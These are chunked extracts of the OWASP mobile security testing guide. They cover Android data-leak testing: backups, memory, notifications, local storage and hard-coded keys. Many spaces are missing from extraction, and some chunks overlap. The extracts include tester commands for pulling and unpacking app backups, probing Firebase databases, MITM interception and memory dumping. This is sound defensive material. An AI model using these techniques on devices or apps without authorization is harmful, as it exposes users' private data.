    "text": "attacker to extractit. 200\\nADB Backup Support Android provides an attribute called allowBackup to back up all your application data. This attribute is set in the AndroidManifest.xmlfile. Ifthevalueofthisattributeistrue,thedeviceallowsuserstobackuptheapplicationwith AndroidDebugBridge(ADB)viathecommand$ adb backup. Topreventtheappdatabackup,settheandroid:allowBackupattributetofalse. Whenthisattributeisunavailable,the allowBackupsettingisenabledbydefault,andbackupmustbemanuallydeactivated. Note: Ifthedevicewasencrypted,thenthebackupfileswillbeencryptedaswell. Process Memory AllapplicationsonAndroidusememorytoperformnormalcomputationaloperationslikeanyregularmodern-daycom- puter. Itisofnosurprisethenthatattimessensitiveoperationswillbeperformedwithinprocessmemory. Forthisreason, itisimportantthatoncetherelevantsensitivedatahasbeenprocessed,itshouldbedisposedfromprocessmemoryas quicklyaspossible. Theinvestigationofanapplication’smemorycanbedonefrommemorydumps,andfromanalyzingthememoryinreal timeviaadebugger. For an overview of possible sources of data exposure, check the documentation and identify application components before you examine the source code. For example, sensitive data from a backend may be in the HTTP client, the XML parser,etc. Youwantallthesecopiestoberemovedfrommemoryassoonaspossible. Inaddition, understandingtheapplication’sarchitectureandthearchitecture’sroleinthesystemwillhelpyouidentify sensitive information that doesn’t have to be exposed in memory at all. For example, assume your app receives data from one server and transfers it to another without any processing. That data can be handled in an encrypted format, whichpreventsexposureinmemory. However,ifyouneedtoexposesensitivedatainmemory,youshouldmakesurethatyourappisdesignedtoexposeas fewdatacopiesaspossibleasbrieflyaspossible. Inotherwords,youwantthehandlingofsensitivedatatobecentralized (i.e.,withasfewcomponentsaspossible)andbasedonprimitive,mutabledatastructures. The latter requirement gives developers direct memory access. Make sure that they use this access to overwrite the sensitivedatawithdummydata(typicallyzeroes). Examplesofpreferabledatatypesincludebyte []andchar [],but notStringorBigInteger. WheneveryoutrytomodifyanimmutableobjectlikeString,youcreateandchangeacopy oftheobject. Using non-primitive mutable types like StringBuffer and StringBuilder may be acceptable, but it’s indicative and requires care. Types like StringBuffer are used to modify content (which is what you want to do). To access such a type’svalue,however,youwouldusethetoStringmethod,whichwouldcreateanimmutablecopyofthedata. There areseveralwaystousethesedatatypeswithoutcreatinganimmutablecopy,buttheyrequiremoreeffortthanusinga primitivearray. SafememorymanagementisonebenefitofusingtypeslikeStringBuffer,butthiscanbeatwo-edged sword. Ifyoutrytomodifythecontentofoneofthesetypesandthecopyexceedsthebuffercapacity, thebuffersize willautomaticallyincrease. Thebuffercontentmaybecopiedtoadifferentlocation, leavingtheoldcontentwithouta referenceusetooverwriteit. Unfortunately,fewlibrariesandframeworksaredesignedtoallowsensitivedatatobeoverwritten. Forexample,destroy- ingakey,asshownbelow,doesn’tremovethekeyfrommemory: ExampleinJava: SecretKeysecretKey =newSecretKeySpec(\"key\".getBytes(),\"AES\"); secretKey.destroy(); ExampleinKotlin: valsecretKey:SecretKey =SecretKeySpec(\"key\".toByteArray(),\"AES\") secretKey.destroy() 201\\nOverwritingthebackingbyte-arrayfromsecretKey.getEncodeddoesn’tremovethekeyeither;theSecretKeySpec-based key returns a copy of the backing byte-array. See the sections below for the proper way to remove a SecretKey from memory. The RSA key pair is based on the BigInteger type and therefore resides in memory after its first use outside the An- droidKeyStore. Someciphers(suchastheAESCipherinBouncyCastle)donotproperlycleanuptheirbyte-arrays. User-provideddata(credentials,socialsecuritynumbers,creditcardinformation,etc.) isanothertypeofdatathatmay beexposedinmemory. Regardlessofwhetheryouflagitasapasswordfield,EditTextdeliverscontenttotheappvia theEditableinterface. Ifyourappdoesn’tprovideEditable.Factory,user-provideddatawillprobablybeexposedin memory for longer than necessary. The default Editable implementation, the SpannableStringBuilder, causes the sameissuesasJava’sStringBuilderandStringBuffercause(discussedabove). Third-party Services Embedded in the App Thefeaturesprovidedbythird-partyservicescaninvolvetrackingservicestomonitortheuser’sbehaviorwhileusingthe app,sellingbanneradvertisements,orimprovingtheuserexperience. Thedownsideisthatdevelopersdon’tusuallyknowthedetailsofthecodeexecutedviathird-partylibraries. Consequently, nomoreinformationthanisnecessaryshouldbesenttoaservice,andnosensitiveinformationshouldbedisclosed. Mostthird-partyservicesareimplementedintwoways: • withastandalonelibrary • withafullSDK User Interface UI Components Atcertainpointsintime,theuserwillhavetoentersensitiveinformationintotheapplication. Thisdatamaybefinancial informationsuchascreditcarddataoruseraccountpasswords,ormaybehealthcaredata. Thedatamaybeexposedif theappdoesn’tproperlymaskitwhileitisbeingtyped. In order to prevent disclosure and mitigate risks such as shoulder surfing you should verify that no sensitive data is exposed via the user interface unless explicitly required (e.g. a password being entered). For the data required to be presentitshouldbeproperlymasked,typicallybyshowingasterisksordotsinsteadofcleartext. Screenshots Manufacturerswanttoprovidedeviceuserswithanaestheticallypleasingexperienceatapplicationstartupandexit,so they introduced the screenshot-saving feature for use when the application is backgrounded. This feature may pose a securityrisk. Sensitivedatamaybeexposediftheuserdeliberatelyscreenshotstheapplicationwhilesensitivedatais displayed. A malicious application that is running on the device and able to continuously capture the screen may also exposedata. Screenshotsarewrittentolocalstorage,fromwhichtheymayberecoveredbyarogueapplication(ifthe deviceisrooted)orsomeonewhohasstolenthedevice. For example, capturing a screenshot of a banking application may reveal information about the user’s account, credit, transactions,andsoon. App Notifications Itisimportanttounderstandthatnotificationsshouldneverbeconsideredprivate. Whenanotificationishandledbythe Androidsystemitisbroadcastedsystem-wideandanyapplicationrunningwithaNotificationListenerServicecanlisten forthesenotificationstoreceivetheminfullandmayhandlethemhoweveritwants. TherearemanyknownmalwaresamplessuchasJoker,andAlienwhichabusestheNotificationListenerServiceto listenfornotificationsonthedeviceandthensendthemtoattacker-controlledC2infrastructure. Commonlythisisdone 202\\ntolistenfortwo-factorauthentication(2FA)codesthatappearasnotificationsonthedevicewhicharethensenttothe attacker. Asaferalternativefortheuserwouldbetousea2FAapplicationthatdoesnotgeneratenotifications. FurthermorethereareanumberofappsontheGooglePlayStorethatprovidenotificationlogging,whichlogslocallyany notificationsontheAndroidsystem. ThishighlightsthatnotificationsareinnowayprivateonAndroidandaccessibleby anyotherapponthedevice. Forthisreasonallnotificationusageshouldbeinspectedforconfidentialorhighriskinformationthatcouldbeusedby maliciousapplications. Keyboard Cache Whenusersenterinformationininputfields,thesoftwareautomaticallysuggestsdata. Thisfeaturecanbeveryusefulfor messagingapps. However,thekeyboardcachemaydisclosesensitiveinformationwhentheuserselectsaninputfield thattakesthistypeofinformation. Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services Platform: android MASVSV1: MSTG-STORAGE-4 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis To determine whether API calls and functions provided by the third-party library are used according to best practices, reviewtheirsourcecode,requestedpermissionsandcheckforanyknownvulnerabilities. Alldatathat’ssenttothird-partyservicesshouldbeanonymizedtopreventexposureofPII(PersonalIdentifiableInforma- tion)thatwouldallowthethirdpartytoidentifytheuseraccount. Nootherdata(suchasIDsthatcanbemappedtoa useraccountorsession)shouldbesenttoathirdparty. Dynamic Analysis Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server,youcanperformdynamicanalysisbylaunchingaman-in-the-middle(MITM)attackwithBurpSuiteProfessionalor OWASPZAP.Onceyouroutethetrafficthroughtheinterceptionproxy,youcantrytosniffthetrafficthatpassesbetween theappandserver. Allapprequeststhataren’tsentdirectlytotheserveronwhichthemainfunctionishostedshould becheckedforsensitiveinformation,suchasPIIinatrackeroradservice.",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 84
    }
  },
  {
    "text": "Overview Static Analysis To determine whether API calls and functions provided by the third-party library are used according to best practices, reviewtheirsourcecode,requestedpermissionsandcheckforanyknownvulnerabilities. Alldatathat’ssenttothird-partyservicesshouldbeanonymizedtopreventexposureofPII(PersonalIdentifiableInforma- tion)thatwouldallowthethirdpartytoidentifytheuseraccount. Nootherdata(suchasIDsthatcanbemappedtoa useraccountorsession)shouldbesenttoathirdparty. Dynamic Analysis Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server,youcanperformdynamicanalysisbylaunchingaman-in-the-middle(MITM)attackwithBurpSuiteProfessionalor OWASPZAP.Onceyouroutethetrafficthroughtheinterceptionproxy,youcantrytosniffthetrafficthatpassesbetween theappandserver. Allapprequeststhataren’tsentdirectlytotheserveronwhichthemainfunctionishostedshould becheckedforsensitiveinformation,suchasPIIinatrackeroradservice. Determining Whether Sensitive Data Is Shared with Third Parties via Notifications Platform: android MASVSV1: MSTG-STORAGE-4 MASVSV2: MASVS-STORAGE-2 203\\nOverview Static Analysis SearchforanyusageoftheNotificationManagerclasswhichmightbeanindicationofsomeformofnotificationmanage- ment. Iftheclassisbeingused,thenextstepwouldbetounderstandhowtheapplicationisgeneratingthenotifications andwhichdataendsupbeingshown. Dynamic Analysis Run the application and start tracing all calls to functions related to the notifications creation, e.g. setContentTitle or setContentText from NotificationCompat.Builder. Observe the trace in the end and evaluate if it contains any sensitiveinformationwhichanotherappmighthaveeavesdropped. Testing Backups for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-8 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis Local ChecktheAndroidManifest.xmlfileforthefollowingflag: android:allowBackup=\"true\" If the flag value is true, determine whether the app saves any kind of sensitive data (check the test case “Testing for SensitiveDatainLocalStorage”). Cloud Regardlessofwhetheryouusekey/valuebackuporautobackup,youmustdeterminethefollowing: • whichfilesaresenttothecloud(e.g.,SharedPreferences) • whetherthefilescontainsensitiveinformation • whethersensitiveinformationisencryptedbeforebeingsenttothecloud. Ifyoudon’twanttosharefileswithGoogleCloud,youcanexcludethemfromAutoBackup. Sensitiveinformation storedatrestonthedeviceshouldbeencryptedbeforebeingsenttothecloud. • AutoBackup: YouconfigureAutoBackupviathebooleanattributeandroid:allowBackupwithintheapplication’s manifest file. Auto Backup is enabled by default for applications that target Android 6.0 (API level 23). You can usetheattributeandroid:fullBackupOnlytoactivateautobackupwhenimplementingabackupagent,butthis attributeisavailableforAndroidversions6.0andaboveonly. OtherAndroidversionsusekey/valuebackupinstead. android:fullBackupOnly Auto backup includes almost all the app files and stores up 25 MB of them per app in the user’s Google Drive account. Onlythemostrecentbackupisstored;thepreviousbackupisdeleted. 204\\n• Key/Value Backup: Toenablekey/valuebackup,youmustdefinethebackupagentinthemanifestfile. Lookin AndroidManifest.xmlforthefollowingattribute: android:backupAgent Toimplementkey/valuebackup,extendoneofthefollowingclasses: • BackupAgent • BackupAgentHelper Tocheckforkey/valuebackupimplementations,lookfortheseclassesinthesourcecode. Dynamic Analysis Afterexecutingallavailableappfunctions, attempttobackupviaadb. Ifthebackupissuccessful, inspectthebackup archiveforsensitivedata. Openaterminalandrunthefollowingcommand: adbbackup -apk -nosystem <package-name> ADBshouldrespondnowwith“Nowunlockyourdeviceandconfirmthebackupoperation”andyoushouldbeaskedon the Android phone for a password. This is an optional step and you don’t need to provide one. If the phone does not promptthismessage,trythefollowingcommandincludingthequotes: adbbackup \"-apk-nosystem<package-name>\" Theproblemhappenswhenyourdevicehasanadbversionpriorto1.0.31. Ifthat’sthecaseyoumustuseanadbversion of1.0.31alsoonyourhostcomputer. Versionsofadbafter1.0.32brokethebackwardscompatibility. ApprovethebackupfromyourdevicebyselectingtheBackupmydataoption. Afterthebackupprocessisfinished,the file.abwillbeinyourworkingdirectory. Runthefollowingcommandtoconvertthe.abfiletotar. ddif=mybackup.abbs=24skip=1|opensslzlib -d>mybackup.tar Incaseyougettheerroropenssl:Error: 'zlib' is an invalid command. youcantrytousePythoninstead. ddif=backup.abbs=1skip=24 |python -c\"importzlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))\" >backup.tar The Android Backup Extractor is another alternative backup tool. To make the tool to work, you have to download the OracleJCEUnlimitedStrengthJurisdictionPolicyFilesforJRE7orJRE8andplacethemintheJRElib/securityfolder. Run thefollowingcommandtoconvertthetarfile: java -jar abe.jarunpackbackup.ab ifitshowssomeCipherinformationandusage,whichmeansithasn’tunpackedsuccessfully. Inthiscaseyoucangivea trywithmorearguments: abe[-debug][-useenv=yourenv]unpack <backup.ab><backup.tar>[password] [password]isthepasswordwhenyourandroiddeviceaskedyouearlier. Forexamplehereis: 123 java -jar abe.jarunpackbackup.abbackup.tar123 Extractthetarfiletoyourworkingdirectory. 205\\ntarxvfmybackup.tar Testing Local Storage for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-1,MSTG-STORAGE-2 MASVSV2: MASVS-STORAGE-1 Overview Thistestcasefocusesonidentifyingpotentiallysensitivedatastoredbyanapplicationandverifyingifitissecurelystored. Thefollowingchecksshouldbeperformed: • Analyzedatastorageinthesourcecode. • Besuretotriggerallpossiblefunctionalityintheapplication(e.g.byclickingeverywherepossible)inordertoensure datageneration. • Checkallapplicationgeneratedandmodifiedfilesandensurethatthestoragemethodissufficientlysecure. – ThisincludesSharedPreferences,SQLdatabases,RealmDatabases,InternalStorage,ExternalStorage,etc. Ingeneralsensitivedatastoredlocallyonthedeviceshouldalwaysbeatleastencrypted,andanykeysusedforencryption methodsshouldbesecurelystoredwithintheAndroidKeystore. Thesefilesshouldalsobestoredwithintheapplication sandbox. Ifachievablefortheapplication,sensitivedatashouldbestoredoffdeviceor,evenbetter,notstoredatall. Static Analysis First of all, try to determine the kind of storage used by the Android app and to find out whether the app processes sensitivedatainsecurely. • Check AndroidManifest.xml for read/write external storage permissions, for example, uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\". • CheckthesourcecodeforkeywordsandAPIcallsthatareusedtostoredata: – Filepermissions,suchas: ∗ MODE_WORLD_READABLE or MODE_WORLD_WRITABLE: You should avoid using MODE_WORLD_WRITEABLE and MODE_WORLD_READABLE for files because any app will be able to read from or write to the files, even if they are stored in the app’s private data directory. If data must be shared with other applications, consideracontentprovider. Acontentprovideroffersreadandwritepermissionstootherappsandcan grantdynamicpermissiononacase-by-casebasis. – Classesandfunctions,suchas: ∗ theSharedPreferencesclass(storeskey-valuepairs) ∗ theFileOutPutStreamclass(usesinternalorexternalstorage) ∗ thegetExternal*functions(useexternalstorage) ∗ thegetWritableDatabasefunction(returnsaSQLiteDatabaseforwriting) ∗ thegetReadableDatabasefunction(returnsaSQLiteDatabaseforreading) ∗ thegetCacheDirandgetExternalCacheDirsfunction(usecachedfiles) EncryptionshouldbeimplementedusingprovenSDKfunctions. Thefollowingdescribesbadpracticestolookforinthe sourcecode: • Locallystoredsensitiveinformation“encrypted”viasimplebitoperationslikeXORorbitflipping. Theseoperations shouldbeavoidedbecausetheencrypteddatacanberecoveredeasily. • KeysusedorcreatedwithoutAndroidonboardfeatures,suchastheAndroidKeyStore • Keysdisclosedbyhard-coding 206\\nA typical misuse are hard-coded cryptographic keys. Hard-coded and world-readable cryptographic keys significantly increasethepossibilitythatencrypteddatawillberecovered. Onceanattackerobtainsthedata,decryptingitistrivial. Symmetric cryptography keys must be stored on the device, so identifying them is just a matter of",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 85
    }
  },
  {
    "text": "thegetExternal*functions(useexternalstorage) ∗ thegetWritableDatabasefunction(returnsaSQLiteDatabaseforwriting) ∗ thegetReadableDatabasefunction(returnsaSQLiteDatabaseforreading) ∗ thegetCacheDirandgetExternalCacheDirsfunction(usecachedfiles) EncryptionshouldbeimplementedusingprovenSDKfunctions. Thefollowingdescribesbadpracticestolookforinthe sourcecode: • Locallystoredsensitiveinformation“encrypted”viasimplebitoperationslikeXORorbitflipping. Theseoperations shouldbeavoidedbecausetheencrypteddatacanberecoveredeasily. • KeysusedorcreatedwithoutAndroidonboardfeatures,suchastheAndroidKeyStore • Keysdisclosedbyhard-coding 206\\nA typical misuse are hard-coded cryptographic keys. Hard-coded and world-readable cryptographic keys significantly increasethepossibilitythatencrypteddatawillberecovered. Onceanattackerobtainsthedata,decryptingitistrivial. Symmetric cryptography keys must be stored on the device, so identifying them is just a matter of time and effort. Considerthefollowingcode: this.db=localUserSecretStore.getWritableDatabase(\"SuperPassword123\"); Obtainingthekeyistrivialbecauseitiscontainedinthesourcecodeandidenticalforallinstallationsoftheapp. Encrypting datathis way is notbeneficial. Lookfor hard-codedAPI keys/privatekeysand other valuable data; they pose asimilar risk. Encoded/encryptedkeysrepresentanotherattempttomakeitharderbutnotimpossibletogetthecrownjewels. Considerthefollowingcode: ExampleinJava: //AmorecomplicatedefforttostoretheXOR'edhalvesofakey(insteadofthekeyitself) private static final String[]myCompositeKey =newString[]{ \"oNQavjbaNNSgEqoCkT9Em4imeQQ=\",\"3o8eFOX4ri/F8fgHgiy/BS47\" }; ExampleinKotlin: private valmyCompositeKey =arrayOf<String>(\"oNQavjbaNNSgEqoCkT9Em4imeQQ=\", \"3o8eFOX4ri/F8fgHgiy/BS47\") Thealgorithmfordecodingtheoriginalkeymightbesomethinglikethis: ExampleinJava: public void useXorStringHiding(StringmyHiddenMessage){ byte[]xorParts0 =Base64.decode(myCompositeKey[0],0); byte[]xorParts1 =Base64.decode(myCompositeKey[1],0); byte[]xorKey =newbyte[xorParts0.length]; for(inti=0;i<xorParts1.length;i++){ xorKey[i]=(byte)(xorParts0[i]^xorParts1[i]); } HidingUtil.doHiding(myHiddenMessage.getBytes(),xorKey,false); } ExampleinKotlin: funuseXorStringHiding(myHiddenMessage:String){ valxorParts0 =Base64.decode(myCompositeKey[0],0) valxorParts1 =Base64.decode(myCompositeKey[1],0) valxorKey =ByteArray(xorParts0.size) for(iinxorParts1.indices) { xorKey[i]=(xorParts0[i]xorxorParts1[i]).toByte() } HidingUtil.doHiding(myHiddenMessage.toByteArray(),xorKey,false) } Verifycommonlocationsofsecrets: • resources(typicallyatres/values/strings.xml)Example: <resources> <string name=\"app_name\">SuperApp</string> <string name=\"hello_world\">Helloworld!</string> <string name=\"action_settings\">Settings</string> <string name=\"secret_key\">My_Secret_Key</string> </resources> • buildconfigs,suchasinlocal.propertiesorgradle.propertiesExample: buildTypes { debug { minifyEnabled true buildConfigField \"String\",\"hiddenPassword\",\"\\\"${hiddenPassword}\\\"\" } } 207\\nDynamic Analysis Installandusetheapp,executingallfunctionsatleastonce. Datacanbegeneratedwhenenteredbytheuser,sentby theendpoint,orshippedwiththeapp. Thencompletethefollowing: • Checkbothinternalandexternallocalstorageforanyfilescreatedbytheapplicationthatcontainsensitivedata. • Identifydevelopmentfiles,backupfiles,andoldfilesthatshouldn’tbeincludedwithaproductionrelease. • Determine whether SQLite databases are available and whether they contain sensitive information. SQLite databasesarestoredin/data/data/<package-name>/databases. • IdentifyifSQLitedatabasesareencrypted. Ifso, determinehowthedatabasepasswordisgeneratedandstored andifthisissufficientlyprotectedasdescribedinthe“StoringaKey”sectionoftheKeystoreoverview. • Check Shared Preferences that are stored as XML files (in /data/data/<package-name>/shared_prefs) for sen- sitive information. Shared Preferences are insecure and unencrypted by default. Some apps might opt to use secure-preferencestoencryptthevaluesstoredinSharedPreferences. • Check the permissions of the files in /data/data/<package-name>. Only the user and group created when you installedtheapp(e.g.,u0_a82)shouldhaveuserread,write,andexecutepermissions(rwx). Otherusersshould nothavepermissiontoaccessfiles,buttheymayhaveexecutepermissionsfordirectories. • CheckfortheusageofanyFirebaseReal-timedatabasesandattempttoidentifyiftheyaremisconfiguredbymaking thefollowingnetworkcall: – https://_firebaseProjectName_.firebaseio.com/.json • Determine whether a Realm database is available in /data/data/<package-name>/files/, whether it is unen- crypted,andwhetheritcontainssensitiveinformation. Bydefault,thefileextensionisrealmandthefilenameis default. InspecttheRealmdatabasewiththeRealmBrowser. Testing Memory for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-10 MASVSV2: MASVS-STORAGE-2 Overview Analyzingmemorycanhelpdevelopersidentifytherootcausesofseveralproblems,suchasapplicationcrashes. However, itcanalsobeusedtoaccesssensitivedata. Thissectiondescribeshowtocheckfordatadisclosureviaprocessmemory. First identify sensitive information that is stored in memory. Sensitive assets have likely been loaded into memory at somepoint. Theobjectiveistoverifythatthisinformationisexposedasbrieflyaspossible. To investigate an application’s memory, you must first create a memory dump. You can also analyze the memory in real-time,e.g.,viaadebugger. Regardlessofyourapproach,memorydumpingisaveryerror-proneprocessintermsof verificationbecauseeachdumpcontainstheoutputofexecutedfunctions. Youmaymissexecutingcriticalscenarios. In addition,overlookingdataduringanalysisisprobableunlessyouknowthedata’sfootprint(eithertheexactvalueorthe dataformat). Forexample,iftheappencryptswitharandomlygeneratedsymmetrickey,youlikelywon’tbeabletospot itinmemoryunlessyoucanrecognizethekey’svalueinanothercontext. Therefore,youarebetteroffstartingwithstaticanalysis. Static Analysis Whenperformingstaticanalysistoidentifysensitivedatathatisexposedinmemory,youshould: • Trytoidentifyapplicationcomponentsandmapwheredataisused. • Makesurethatsensitivedataishandledbyasfewcomponentsaspossible. • Makesurethatobjectreferencesareproperlyremovedoncetheobjectcontainingthesensitivedataisnolonger needed. • Makesurethatgarbagecollectionisrequestedafterreferenceshavebeenremoved. 208\\n• Makesurethatsensitivedatagetsoverwrittenassoonasitisnolongerneeded. – Don’trepresentsuchdatawithimmutabledatatypes(suchasStringandBigInteger). – Avoidnon-primitivedatatypes(suchasStringBuilder). – Overwritereferencesbeforeremovingthem,outsidethefinalizemethod. – Payattentiontothird-partycomponents(librariesandframeworks). PublicAPIsaregoodindicators. Determine whetherthepublicAPIhandlesthesensitivedataasdescribedinthischapter. Thefollowingsectiondescribespitfallsofdataleakageinmemoryandbestpracticesforavoidingthem. Don’tuseimmutablestructures(e.g., StringandBigInteger)torepresentsecrets. Nullifyingthesestructureswillbe ineffective: thegarbagecollectormaycollectthem, buttheymayremainontheheapaftergarbagecollection. Never- theless, you should ask for garbage collection after every critical operation (e.g., encryption, parsing server responses thatcontainsensitiveinformation). Whencopiesoftheinformationhavenotbeenproperlycleaned(asexplainedbelow), yourrequestwillhelpreducethelengthoftimeforwhichthesecopiesareavailableinmemory. Toproperlycleansensitiveinformationfrommemory,storeitinprimitivedatatypes,suchasbyte-arrays(byte[])and char-arrays(char[]). Youshouldavoidstoringtheinformationinmutablenon-primitivedatatypes. Makesuretooverwritethecontentofthecriticalobjectoncetheobjectisnolongerneeded. Overwritingthecontentwith zeroesisonesimpleandverypopularmethod: ExampleinJava: byte[]secret =null; try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { if(null !=secret){ Arrays.fill(secret,(byte)0); } } ExampleinKotlin: valsecret:ByteArray?=null try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { if(null !=secret){ Arrays.fill(secret,0.toByte()) } } Thisdoesn’t,however,guaranteethatthecontentwillbeoverwrittenatruntime. Tooptimizethebytecode,thecompiler willanalyzeanddecidenottooverwritedatabecauseitwillnotbeusedafterwards(i.e.,itisanunnecessaryoperation). EvenifthecodeisinthecompiledDEX,theoptimizationmayoccurduringthejust-in-timeorahead-of-timecompilation intheVM. Thereisnosilverbulletforthisproblembecausedifferentsolutionshavedifferentconsequences. Forexample,youmay performadditionalcalculations(e.g., XORthedataintoadummybuffer), butyou’llhavenowaytoknowtheextentof thecompiler’soptimizationanalysis. Ontheotherhand, usingtheoverwrittendataoutsidethecompiler’sscope(e.g., serializingitinatempfile)guaranteesthatitwillbeoverwrittenbutobviouslyimpactsperformanceandmaintenance. Then,usingArrays.filltooverwritethedataisabadideabecausethemethodisanobvioushookingtarget(seethe chapter“TamperingandReverseEngineeringonAndroid”formoredetails). Thefinalissuewiththeaboveexampleisthatthecontentwasoverwrittenwithzeroesonly. Youshouldtrytooverwrite criticalobjectswithrandomdataorcontentfromnon-criticalobjects. Thiswillmakeitreallydifficulttoconstructscanners thatcanidentifysensitivedataonthebasisofitsmanagement. Belowisanimprovedversionofthepreviousexample: ExampleinJava: byte[]nonSecret =somePublicString.getBytes(\"ISO-8859-1\"); byte[]secret =null; try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { 209\\nif(null !=secret){ for(inti=0;i<secret.length;i++){ secret[i]=nonSecret[i%nonSecret.length]; } FileOutputStreamout =newFileOutputStream(\"/dev/null\"); out.write(secret); out.flush(); out.close(); } } ExampleinKotlin: valnonSecret:ByteArray =somePublicString.getBytes(\"ISO-8859-1\") valsecret:ByteArray?=null try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { if(null !=secret){ for(iinsecret.indices){ secret[i]=nonSecret[i%nonSecret.size] } valout=FileOutputStream(\"/dev/null\") out.write(secret) out.flush() out.close() } } Formoreinformation,takealookatSecurelyStoringSensitiveDatainRAM. Inthe“StaticAnalysis”section,wementionedtheproperwaytohandlecryptographickeyswhenyouareusingAndroid- KeyStoreorSecretKey. For a better implementation of SecretKey, look at the SecureSecretKey class below. Although the implementation is probably missing some boilerplate code that would make the class compatible with SecretKey, it addresses the main securityconcerns: • Nocross-contexthandlingofsensitivedata. Eachcopyofthekeycanbeclearedfromwithinthescopeinwhichit wascreated. • Thelocalcopyisclearedaccordingtotherecommendationsgivenabove. ExampleinJava: public class",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 86
    }
  },
  {
    "text": "out.flush() out.close() } } Formoreinformation,takealookatSecurelyStoringSensitiveDatainRAM. Inthe“StaticAnalysis”section,wementionedtheproperwaytohandlecryptographickeyswhenyouareusingAndroid- KeyStoreorSecretKey. For a better implementation of SecretKey, look at the SecureSecretKey class below. Although the implementation is probably missing some boilerplate code that would make the class compatible with SecretKey, it addresses the main securityconcerns: • Nocross-contexthandlingofsensitivedata. Eachcopyofthekeycanbeclearedfromwithinthescopeinwhichit wascreated. • Thelocalcopyisclearedaccordingtotherecommendationsgivenabove. ExampleinJava: public class SecureSecretKey implements javax.crypto.SecretKey,Destroyable { private byte[]key; private final Stringalgorithm; /**ConstructsSecureSecretKeyinstanceoutofacopyoftheprovidedkeybytes. *Thecallerisresponsibleofclearingthekeyarrayprovidedasinput. *Theinternalcopyofthekeycanbeclearedbycallingthedestroy() method. */ public SecureSecretKey(final byte[]key,final Stringalgorithm){ this.key=key.clone(); this.algorithm =algorithm; } public String getAlgorithm(){ return this.algorithm; } public String getFormat(){ return \"RAW\"; } /**Returnsacopyofthekey. *Makesuretoclearthereturnedbytearraywhennolongerneeded. */ public byte[]getEncoded(){ if(null ==key){ throw newNullPointerException(); } return key.clone(); } /**Overwritesthekeywithdummydatatoensurethiscopyisnolongerpresentinmemory.*/ public void destroy(){ if(isDestroyed()){ 210\\nreturn; } byte[]nonSecret =newString(\"RuntimeException\").getBytes(\"ISO-8859-1\"); for(inti=0;i<key.length;i++){ key[i]=nonSecret[i%nonSecret.length]; } FileOutputStreamout =newFileOutputStream(\"/dev/null\"); out.write(key); out.flush(); out.close(); this.key=null; System.gc(); } public boolean isDestroyed(){ return key==null; } } ExampleinKotlin: class SecureSecretKey(key:ByteArray,algorithm:String):SecretKey,Destroyable { private varkey:ByteArray? private valalgorithm:String override fungetAlgorithm():String { return algorithm } override fungetFormat():String { return \"RAW\" } /**Returnsacopyofthekey. *Makesuretoclearthereturnedbytearraywhennolongerneeded. */ override fungetEncoded():ByteArray { if(null ==key){ throw NullPointerException() } return key!!.clone() } /**Overwritesthekeywithdummydatatoensurethiscopyisnolongerpresentinmemory.*/ override fundestroy(){ if(isDestroyed){ return } valnonSecret:ByteArray =String(\"RuntimeException\").toByteArray(charset(\"ISO-8859-1\")) for(iinkey!!.indices){ key!![i]=nonSecret[i%nonSecret.size] } valout=FileOutputStream(\"/dev/null\") out.write(key) out.flush() out.close() key=null System.gc() } override funisDestroyed():Boolean { return key==null } /**ConstructsSecureSecretKeyinstanceoutofacopyoftheprovidedkeybytes. *Thecallerisresponsibleofclearingthekeyarrayprovidedasinput. *Theinternalcopyofthekeycanbeclearedbycallingthedestroy()method. */ init { this.key=key.clone() this.algorithm =algorithm } } Secureuser-provideddataisthefinalsecureinformationtypeusuallyfoundinmemory. Thisisoftenmanagedbyimple- mentingacustominputmethod,forwhichyoushouldfollowtherecommendationsgivenhere. However,Androidallows informationtobepartiallyerasedfromEditTextbuffersviaacustomEditable.Factory. EditTexteditText =...;// pointyourvariabletoyourEditTextinstance EditText.setEditableFactory(newEditable.Factory(){ public Editable newEditable(CharSequencesource){ ...//returnanewinstanceofasecureimplementationofEditable. } }); 211\\nRefer to the SecureSecretKey example above for an example Editable implementation. Note that you will be able tosecurelyhandleallcopiesmadebyeditText.getTextifyouprovideyourfactory. Youcanalsotrytooverwritethe internalEditTextbufferbycallingeditText.setText,butthereisnoguaranteethatthebufferwillnothavebeencopied already. IfyouchoosetorelyonthedefaultinputmethodandEditText,youwillhavenocontroloverthekeyboardor othercomponentsthatareused. Therefore,youshouldusethisapproachforsemi-confidentialinformationonly. Inallcases,makesurethatsensitivedatainmemoryisclearedwhenausersignsoutoftheapplication. Finally,make surethathighlysensitiveinformationisclearedoutthemomentanActivityorFragment’sonPauseeventistriggered. Notethatthismightmeanthatauserhastore-authenticateeverytimetheapplicationresumes. Dynamic Analysis Static analysis will help you identify potential problems, but it can’t provide statistics about how long data has been exposedinmemory,norcanithelpyouidentifyproblemsinclosed-sourcedependencies. Thisiswheredynamicanalysis comesintoplay. Therearevariouswaystoanalyzethememoryofaprocess,e.g.liveanalysisviaadebugger/dynamicinstrumentation andanalyzingoneormorememorydumps. Retrieving and Analyzing a Memory Dump Whether you are using a rooted or a non-rooted device, you can dump the app’s process memory with objection and Fridump. Youcanfindadetailedexplanationofthisprocessinthesection“MemoryDump”,inthechapter“Tampering andReverseEngineeringonAndroid”. Afterthememoryhasbeendumped(e.g.toafilecalled“memory”),dependingonthenatureofthedatayou’relooking for, you’ll need a set of different tools to process and analyze that memory dump. For instance, if you’re focusing on strings,itmightbesufficientforyoutoexecutethecommandstringsorrabin2 -zztoextractthosestrings. ##usingstrings $stringsmemory >strings.txt ##usingrabin2 $rabin2 -ZZmemory >strings.txt 